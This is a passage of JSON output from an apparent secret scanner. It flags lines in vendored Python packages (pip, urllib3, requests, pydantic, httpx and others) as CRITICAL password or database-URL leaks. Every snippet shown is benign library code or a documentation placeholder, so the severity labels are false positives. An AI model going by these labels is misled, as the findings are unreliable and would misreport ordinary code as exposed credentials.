            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 370,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2109,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2117,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._ctx.use_certificate_chain_file(cert"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 477,
            "severity": "CRITICAL",
            "context": "tance(password, six.binary_type):\n                password = password.encode(\"utf-8\")\n            self._ctx.set_passwd_cb(lambda"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._client_cert = certfile\n        self"
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "4.b16encode(random_bytes[:8]).decode(\"utf-8\")\n    password = base64.b16encode(random_bytes[8:])  # Must be valid UTF-8\n    tempdirectory = tempfi"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/random/tests/test_direct.py",
            "type": "passwords",
            "line": 47,
            "severity": "CRITICAL",
            "context": "  # cffi cannot succeed\n    MISSING_CFFI = True\n\n\npwd = os.path.dirname(os.path.abspath(__file__))\n\n\ndef assert_state_equal(actual, target):\n    for"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 93,
            "severity": "CRITICAL",
            "context": "g password from keyring for %s\", url)\n            password = self.keyring.get_password(url, username)\n            if password:\n              "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 94,
            "severity": "CRITICAL",
            "context": "eyring.get_password(url, username)\n            if password:\n                return username, password\n        return None\n\n    def s"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 120,
            "severity": "CRITICAL",
            "context": "L139\n        if username is not None:\n            password = self._get_password(url, username)\n            if password is not None:\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 339,
            "severity": "CRITICAL",
            "context": "etloc from the url.\n        url, netloc, url_user_password = split_auth_netloc_from_url(\n            original_url,\n        )\n\n        # St"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 344,
            "severity": "CRITICAL",
            "context": "credentials embedded in the url\n        username, password = url_user_password\n        if username is not None and password is n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 355,
            "severity": "CRITICAL",
            "context": "nfo:\n                index_url, _, index_url_user_password = index_info\n                logger.debug(\"Found index url %s\""
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 360,
            "severity": "CRITICAL",
            "context": "er_password[0] is not None:\n            username, password = index_url_user_password\n            if username is not None and password "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 402,
            "severity": "CRITICAL",
            "context": "t credentials from original url\n        username, password = self._get_new_credentials(original_url)\n\n        # If credentials not found, use any stor"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 421,
            "severity": "CRITICAL",
            "context": "            username = username or \"\"\n            password = password or \"\"\n\n            # Store any acquired credentia"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 437,
            "severity": "CRITICAL",
            "context": "edentials for this request\n        url, username, password = self._get_url_and_credentials(req.url)\n\n        # Set the url of the request to the url "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 462,
            "severity": "CRITICAL",
            "context": "           return auth[0], auth[1], False\n        password = ask_password(\"Password: \")\n        return username, password, Tr"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 485,
            "severity": "CRITICAL",
            "context": "       if self.use_keyring:\n            username, password = self._get_new_credentials(\n                resp.url,\n                allow_n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 492,
            "severity": "CRITICAL",
            "context": "   if not self.prompting and not username and not password:\n            return resp\n\n        parsed = urllib.parse.urlparse(resp"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 499,
            "severity": "CRITICAL",
            "context": "     save = False\n        if not username and not password:\n            username, password, save = self._prompt_for_password(parsed"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/network/auth.py",
            "type": "passwords",
            "line": 512,
            "severity": "CRITICAL",
            "context": "           username=username,\n                    password=password,\n                )\n\n        # Consume content and "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 429,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        \"\"\"\n        Return "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 442,
            "severity": "CRITICAL",
            "context": "rev_and_auth(url.secret)\n        username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n   "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 443,
            "severity": "CRITICAL",
            "context": "    username, secret_password = user_pass\n        password: Optional[HiddenText] = None\n        if secret_password is not None:\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/versioncontrol.py",
            "type": "passwords",
            "line": 445,
            "severity": "CRITICAL",
            "context": "      if secret_password is not None:\n            password = hide_value(secret_password)\n        extra_args = self.make_rev_args(username,"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 98,
            "severity": "CRITICAL",
            "context": "f make_rev_args(\n        username: Optional[str], password: Optional[HiddenText]\n    ) -> CommandArgs:\n        extra_args: Command"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/vcs/subversion.py",
            "type": "passwords",
            "line": 103,
            "severity": "CRITICAL",
            "context": "extra_args += [\"--username\", username]\n        if password:\n            extra_args += [\"--password\", password]\n\n        return extra"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 142,
            "severity": "CRITICAL",
            "context": "  keyfile: _StrOrBytesPath | None = None,\n        password: _PasswordType | None = None,\n    ) -> None:\n        return self"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/truststore/_api.py",
            "type": "passwords",
            "line": 145,
            "severity": "CRITICAL",
            "context": "(\n            certfile=certfile, keyfile=keyfile, password=password\n        )\n\n    def load_default_certs(\n        se"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 843,
            "severity": "CRITICAL",
            "context": "name = prefix\n        else:\n            username, password = prefix.split(':', 1)\n    if username:\n        username = unquote"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/util.py",
            "type": "passwords",
            "line": 846,
            "severity": "CRITICAL",
            "context": "name:\n        username = unquote(username)\n    if password:\n        password = unquote(password)\n    return username, password"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/distlib/index.py",
            "type": "passwords",
            "line": 83,
            "severity": "CRITICAL",
            "context": " self.username = cfg.get('username')\n        self.password = cfg.get('password')\n        self.realm = cfg.get('realm', '"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 320,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 354,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connection.py",
            "type": "passwords",
            "line": 423,
            "severity": "CRITICAL",
            "context": "         certfile=self.cert_file,\n            key_password=self.key_password,\n            ca_certs=self.ca_certs,\n            c"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 967,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 983,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                cert_file=self.cert_file,\n       "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1039,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            **self.conn_kw\n        )\n\n        ret"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 53,
            "severity": "CRITICAL",
            "context": "   category=DeprecationWarning,\n        )\n        password = str(password)\n    # -- End Removal --\n\n    if isinstance(userna"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 60,
            "severity": "CRITICAL",
            "context": "tin1\")\n\n    if isinstance(password, str):\n        password = password.encode(\"latin1\")\n\n    authstr = \"Basic \" + to_native_strin"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 81,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n\n    def __eq__(self, other):\n        return all("
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/auth.py",
            "type": "passwords",
            "line": 112,
            "severity": "CRITICAL",
            "context": "d):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 323,
            "severity": "CRITICAL",
            "context": "thorization\"]\n\n        try:\n            username, password = get_auth_from_url(new_proxies[scheme])\n        except KeyError:\n            username, pa"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/sessions.py",
            "type": "passwords",
            "line": 329,
            "severity": "CRITICAL",
            "context": "f not scheme.startswith('https') and username and password:\n            headers[\"Proxy-Authorization\"] = _basic_auth_str(username, "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 214,
            "severity": "CRITICAL",
            "context": "ower().startswith(\"socks\"):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] ="
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 218,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                num_pools=self._pool_connections,"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/adapters.py",
            "type": "passwords",
            "line": 427,
            "severity": "CRITICAL",
            "context": "       \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers[\"Proxy-"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 69,
            "severity": "CRITICAL",
            "context": "r)\n            else prompt\n        )\n        self.password = password\n        if choices is not None:\n            self."
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 136,
            "severity": "CRITICAL",
            "context": " prompt,\n            console=console,\n            password=password,\n            choices=choices,\n            show_def"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 203,
            "severity": "CRITICAL",
            "context": "\n        \"\"\"\n        return console.input(prompt, password=password, stream=stream)\n\n    def check_choice(self, value:"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 363,
            "severity": "CRITICAL",
            "context": "umber={result}\")\n\n        while True:\n            password = Prompt.ask(\n                \"Please enter a password [cyan](m"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/prompt.py",
            "type": "passwords",
            "line": 370,
            "severity": "CRITICAL",
            "context": "ompt.invalid]password too short\")\n        print(f\"password={password!r}\")\n\n        fruit = Prompt.ask(\"Enter a fruit\", cho"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2109,
            "severity": "CRITICAL",
            "context": "ires a str prompt). Defaults to True.\n            password: (bool, optional): Hide typed text. Defaults to False.\n  "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/console.py",
            "type": "passwords",
            "line": 2117,
            "severity": "CRITICAL",
            "context": "t, markup=markup, emoji=emoji, end=\"\")\n        if password:\n            result = getpass(\"\", stream=stream)\n        else:\n      "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/util/ssl_.py",
            "type": "passwords",
            "line": 385,
            "severity": "CRITICAL",
            "context": "SLContext.load_verify_locations().\n    :param key_password:\n        Optional password if the keyfile is encrypted.\n    :param "
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/socks.py",
            "type": "passwords",
            "line": 102,
            "severity": "CRITICAL",
            "context": "_socks_options[\"username\"],\n                proxy_password=self._socks_options[\"password\"],\n                proxy_rdns=self._socks"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 473,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._ctx.use_certificate_chain_file(cert"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/pyopenssl.py",
            "type": "passwords",
            "line": 477,
            "severity": "CRITICAL",
            "context": "tance(password, six.binary_type):\n                password = password.encode(\"utf-8\")\n            self._ctx.set_passwd_cb(lambda"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/securetransport.py",
            "type": "passwords",
            "line": 873,
            "severity": "CRITICAL",
            "context": "def load_cert_chain(self, certfile, keyfile=None, password=None):\n        self._client_cert = certfile\n        self"
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/contrib/_securetransport/low_level.py",
            "type": "passwords",
            "line": 231,
            "severity": "CRITICAL",
            "context": "4.b16encode(random_bytes[:8]).decode(\"utf-8\")\n    password = base64.b16encode(random_bytes[8:])  # Must be valid UTF-8\n    tempdirectory = tempfi"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1817,
            "severity": "CRITICAL",
            "context": "ss User(BaseModel):\n        username: str\n        password: SecretStr\n\n    user = User(username='scolvin', password='pa"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1819,
            "severity": "CRITICAL",
            "context": "d: SecretStr\n\n    user = User(username='scolvin', password='password1')\n\n    print(user)\n    #> username='scolvin' passw"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1822,
            "severity": "CRITICAL",
            "context": "ord1')\n\n    print(user)\n    #> username='scolvin' password=SecretStr('**********')\n    print(user.password.get_secret_va"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1839,
            "severity": "CRITICAL",
            "context": "d_serializer\n\n    class Model(BaseModel):\n        password: SecretStr\n        password_bytes: SecretBytes\n\n        @fie"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1846,
            "severity": "CRITICAL",
            "context": "   return v.get_secret_value()\n\n    model = Model(password='IAmSensitive', password_bytes=b'IAmSensitiveBytes')\n    print(m"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1848,
            "severity": "CRITICAL",
            "context": "tes=b'IAmSensitiveBytes')\n    print(model)\n    #> password=SecretStr('**********') password_bytes=SecretBytes(b'********"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1885,
            "severity": "CRITICAL",
            "context": "ss User(BaseModel):\n        username: str\n        password: SecretBytes\n\n    user = User(username='scolvin', password=b'p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/types.py",
            "type": "passwords",
            "line": 1888,
            "severity": "CRITICAL",
            "context": " password=b'password1')\n    #> username='scolvin' password=SecretBytes(b'**********')\n    print(user.password.get_secret_va"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/networks.py",
            "type": "passwords",
            "line": 290,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                host=host,\n                port=p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/networks.py",
            "type": "passwords",
            "line": 476,
            "severity": "CRITICAL",
            "context": "               username=username,\n                password=password,\n                host=host,\n                port=p"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 29,
            "severity": "CRITICAL",
            "context": "hen the URI contains `User Information`_.\n        password: Available when the URI contains `User Information`_.\n\n    ."
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 89,
            "severity": "CRITICAL",
            "context": "= parsed.query\n    username = parsed.username\n    password = parsed.password\n    # urllib.parse.urlparse accepts URLs with a u"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 106,
            "severity": "CRITICAL",
            "context": "ib.parse.quote(username, safe=DELIMS)\n            password = urllib.parse.quote(password, safe=DELIMS)\n\n    return WebSocketURI(secure, hos"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 122,
            "severity": "CRITICAL",
            "context": "oxy address contains `User Information`_.\n        password: Available when the proxy address contains `User Information"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 172,
            "severity": "CRITICAL",
            "context": "ttps\" else 80)\n    username = parsed.username\n    password = parsed.password\n    # urllib.parse.urlparse accepts URLs with a u"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/uri.py",
            "type": "passwords",
            "line": 187,
            "severity": "CRITICAL",
            "context": "ib.parse.quote(username, safe=DELIMS)\n            password = urllib.parse.quote(password, safe=DELIMS)\n\n    return Proxy(scheme, host, port"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/headers.py",
            "type": "passwords",
            "line": 565,
            "severity": "CRITICAL",
            "context": "\",\n        ) from None\n    try:\n        username, password = user_pass.split(\":\", 1)\n    except ValueError:\n        raise Invali"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/starlette/datastructures.py",
            "type": "passwords",
            "line": 115,
            "severity": "CRITICAL",
            "context": "kwargs.pop(\"username\", self.username)\n            password = kwargs.pop(\"password\", self.password)\n\n            if hostname"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/starlette/datastructures.py",
            "type": "passwords",
            "line": 166,
            "severity": "CRITICAL",
            "context": "self.password:\n            url = str(self.replace(password=\"********\"))\n        return f\"{self.__class__.__name__}({rep"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/__init__.py",
            "type": "database_urls",
            "line": 397,
            "severity": "CRITICAL",
            "context": "= None,\n        _create_db: bool = False,\n        db_url: str | None = None,\n        modules: dict[str, Iterabl"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/__init__.py",
            "type": "database_urls",
            "line": 450,
            "severity": "CRITICAL",
            "context": "\n            same format as above.\n        :param db_url:\n            Use a DB_URL string. See :ref:`db_url`\n        :param"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/__init__.py",
            "type": "database_urls",
            "line": 480,
            "severity": "CRITICAL",
            "context": "config_from_config_file(config_file)\n        elif db_url:\n            if not modules:\n                raise ConfigurationE"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/tortoise/__init__.py",
            "type": "database_urls",
            "line": 633,
            "severity": "CRITICAL",
            "context": "\n            await Tortoise.init(\n                db_url='sqlite://db.sqlite3',\n                models={'models': ['app.models']"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_urlparse.py",
            "type": "passwords",
            "line": 247,
            "severity": "CRITICAL",
            "context": "username\", \"\") or \"\", safe=USERNAME_SAFE)\n        password = quote(kwargs.pop(\"password\", \"\") or \"\", safe=PASSWORD_SAFE)\n        "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_auth.py",
            "type": "passwords",
            "line": 165,
            "severity": "CRITICAL",
            "context": "th_header(\n                username=auth_info[0], password=auth_info[2]\n            )\n            yield request\n\n    def "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_auth.py",
            "type": "passwords",
            "line": 189,
            "severity": "CRITICAL",
            "context": "self._username = to_bytes(username)\n        self._password = to_bytes(password)\n        self._last_challenge: _DigestAuthChalleng"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_main.py",
            "type": "passwords",
            "line": 297,
            "severity": "CRITICAL",
            "context": "  if password == \"-\":  # pragma: no cover\n        password = click.prompt(\"Password\", hide_input=True)\n    return (username, "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_client.py",
            "type": "passwords",
            "line": 449,
            "severity": "CRITICAL",
            "context": "):\n            return BasicAuth(username=auth[0], password=auth[1])\n        elif isinstance(auth, Auth):\n            "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_client.py",
            "type": "passwords",
            "line": 469,
            "severity": "CRITICAL",
            "context": " None:\n            return auth\n\n        username, password = request.url.username, request.url.password\n        if username or passw"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_client.py",
            "type": "passwords",
            "line": 470,
            "severity": "CRITICAL",
            "context": "name, request.url.password\n        if username or password:\n            return BasicAuth(username=username, password=password)\n\n"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_client.py",
            "type": "passwords",
            "line": 471,
            "severity": "CRITICAL",
            "context": ":\n            return BasicAuth(username=username, password=password)\n\n        return Auth()\n\n    def _build_redirect_r"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connection.py",
            "type": "passwords",
            "line": 607,
            "severity": "CRITICAL",
            "context": "      self.cert_file = cert_file\n        self.key_password = key_password\n        self.ssl_context = ssl_context\n        se"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connection.py",
            "type": "passwords",
            "line": 662,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.assert_hostname = assert_hostname\n  "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connection.py",
            "type": "passwords",
            "line": 752,
            "severity": "CRITICAL",
            "context": "      key_file=self.key_file,\n                key_password=self.key_password,\n                server_hostname=server_hostname_r"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connection.py",
            "type": "passwords",
            "line": 924,
            "severity": "CRITICAL",
            "context": "key_file,\n        certfile=cert_file,\n        key_password=key_password,\n        ca_certs=ca_certs,\n        ca_cert_dir=ca"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1020,
            "severity": "CRITICAL",
            "context": "      self.cert_reqs = cert_reqs\n        self.key_password = key_password\n        self.ca_certs = ca_certs\n        self.ca_"
          },
          {
            "file": "test_env/lib/python3.12/site-packages/urllib3/connectionpool.py",
            "type": "passwords",
            "line": 1073,
            "severity": "CRITICAL",
            "context": "          key_file=self.key_file,\n            key_password=self.key_password,\n            cert_reqs=self.cert_reqs,\n           "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1186,
            "severity": "CRITICAL",
            "context": "info.split(u\":\")[0]\n\n    def authority(self, with_password=False, **kw):\n        # type: (bool, Any) -> Text\n      "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1197,
            "severity": "CRITICAL",
            "context": "s@localhost:8080'\n\n        Args:\n            with_password: Whether the return value of this method include the\n     "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1206,
            "severity": "CRITICAL",
            "context": "    # first, a bit of twisted compat\n        with_password = kw.pop(\"includeSecrets\", with_password)\n        if kw:\n   "
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "type": "passwords",
            "line": 1731,
            "severity": "CRITICAL",
